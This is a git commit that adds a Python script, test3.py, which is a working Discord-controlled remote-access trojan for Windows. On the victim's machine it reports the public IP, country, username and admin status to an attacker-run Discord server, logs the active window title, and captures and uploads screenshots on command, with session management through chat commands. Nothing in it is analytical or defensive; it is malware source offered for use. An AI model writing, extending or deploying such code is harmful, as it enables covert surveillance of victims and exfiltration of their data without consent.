9307b2406b0f1b34c42b7c5f2f230516504c052a
testy65421 <95231107+testy65421@users.noreply.github.com>
2022-01-28 00:31:09 +0000

    Add files via upload

---
+++ test3.py
@@ -0,0 +1,126 @@
+import winreg
+import ctypes
+import sys
+import os
+import ssl
+import random
+import threading
+import time
+import cv2
+import subprocess
+import discord
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from discord.ext import commands
+from ctypes import *
+import asyncio
+import discord
+from discord import utils
+token = 'DISCORD_TOKEN_HERE'
+global appdata
+appdata = os.getenv('APPDATA')
+client = discord.Client()
+bot = commands.Bot(command_prefix='!')
+ssl._create_default_https_context = ssl._create_unverified_context
+helpmenu = """
+Availaible commands are :
+--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
+"""
+
+
+
+async def activity(client):
+    import time
+    import win32gui
+    while True:
+        global stop_threads
+        if stop_threads:
+            break
+        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        window_displayer = discord.Game(f"Visiting: {current_window}")
+        await client.change_presence(status=discord.Status.online, activity=window_displayer)
+        time.sleep(1)
+
+def between_callback(client):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(activity(client))
+    loop.close()
+
+@client.event
+async def on_ready():
+    import platform
+    import re
+    import urllib.request
+    import json
+    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+        data = json.loads(url.read().decode())
+        flag = data['country_code']
+        ip = data['IPv4']
+    import os
+    total = []
+    global number
+    number = 0
+    global channel_name
+    channel_name = None
+    for x in client.get_all_channels(): 
+        total.append(x.name)
+    for y in range(len(total)):
+        if "session" in total[y]:
+            import re
+            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
+            biggest = max(map(int, result))
+            number = biggest + 1
+        else:
+            pass  
+    if number == 0:
+        channel_name = "session-1"
+        newchannel = await client.guilds[0].create_text_channel(channel_name)
+    else:
+        channel_name = f"session-{number}"
+        newchannel = await client.guilds[0].create_text_channel(channel_name)
+    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
+    channel = client.get_channel(channel_.id)
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}"
+    if is_admin == True:
+        await channel.send(f'{value1} | admin!')
+    elif is_admin == False:
+        await channel.send(value1)
+    game = discord.Game(f"Window logging stopped")
+    await client.change_presence(status=discord.Status.online, activity=game)
+
+
+@client.event
+async def on_message(message):
+    if message.channel.name != channel_name:
+        pass
+    else:
+        total = []
+        for x in client.get_all_channels(): 
+            total.append(x.name)
+        if message.content.startswith("!kill"):
+            try:
+                if message.content[6:] == "all":
+                    for y in range(len(total)): 
+                        if "session" in total[y]:
+                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
+                            await channel_to_delete.delete()
+                        else:
+                            pass
+                else:
+                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
+                    await channel_to_delete.delete()
+                    await message.channel.send(f"[*] {message.content[6:]} killed.")
+            except:
+                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
+
+        if message.content == "!screenshot":
+            import os
+            from mss import mss
+            with mss() as sct:
+                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
+            path = (os.getenv('TEMP')) + r"\monitor.png"
+            file = discord.File((path), filename="monitor.png")
+            await message.channel.send("[*] Command successfuly executed", file=file)
+            os.remove(path)
